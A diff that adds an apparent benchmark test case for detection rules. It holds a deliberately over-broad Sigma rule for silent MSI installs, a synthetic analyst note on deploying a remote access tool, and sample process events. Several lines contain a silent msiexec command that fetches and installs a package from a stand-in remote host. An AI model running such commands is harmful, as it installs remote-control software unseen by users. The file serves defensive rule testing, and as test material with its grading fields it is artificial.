@@ -1,0 +1,99 @@
+id: D7-05
+role: defective
+defect_class: D7
+evasive: true
+why: Image msiexec.exe and CommandLine containing '/qn' look like two independent conditions, but both
+  describe an ordinary silent install; the baseline's 9 benign 'msiexec.exe /i C:\Temp\app.msi /qn' executions
+  (2.25 percent of 400 events) all match, above the 2-event ceiling, because the rule has no source URL,
+  package name or other distinguishing term.
+expected_gate: G11
+report_text: Analyst Note AN-318, remote access tool deployment. After obtaining administrator credentials,
+  the operator pushes a legitimate remote administration package to the victim and installs it silently
+  so the user sees no prompt. The installer is delivered as an MSI and executed as msiexec.exe /i http://198.51.100.9/rmtsvc.msi
+  /qn /norestart from a remote management session. The tool then connects out to the operator's relay
+  and gives interactive control of the desktop. Because the product is signed and commercially available,
+  antivirus did not flag it. The same silent install pattern was used on two servers and one workstation,
+  and the operator deleted the MSI from the staging server afterwards. The relay address was not recovered.
+evidence:
+- msiexec.exe /i http://198.51.100.9/rmtsvc.msi /qn /norestart
+- installs it silently so the user sees no prompt
+logsource: windows_process_creation
+techniques:
+- T1219
+sigma_yaml: |
+  title: Silent MSI Installation via msiexec
+  id: a0d73f68-45e2-49b1-8c07-e69b2d1a3f84
+  status: experimental
+  description: Detects a silent MSI installation through msiexec, the method used to deploy a remote administration tool.
+  references:
+      - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+      - attack.command_and_control
+      - attack.t1219
+  logsource:
+      category: process_creation
+      product: windows
+  detection:
+      selection:
+          Image|endswith: '\msiexec.exe'
+          CommandLine|contains: '/qn'
+      condition: selection
+  falsepositives:
+      - Software deployment tools and administrators installing packages silently
+  level: medium
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\msiexec.exe
+    cmd: msiexec.exe /i http://198.51.100.9/rmtsvc.msi /qn /norestart
+    parent: C:\Windows\System32\wbem\WmiPrvSE.exe
+    parent_cmd: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+    user: LAB\svc-admin
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\msiexec.exe
+    cmd: msiexec.exe /i http://198.51.100.9/rmtsvc.msi /qn /norestart
+    parent: C:\Windows\System32\wbem\WmiPrvSE.exe
+    parent_cmd: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+    user: LAB\svc-admin
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    cmd: WINWORD.EXE /n C:\Users\alice\Documents\report.docx
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\alice\notes.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\msiexec.exe
+    cmd: msiexec.exe /i C:\Temp\app.msi /passive
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
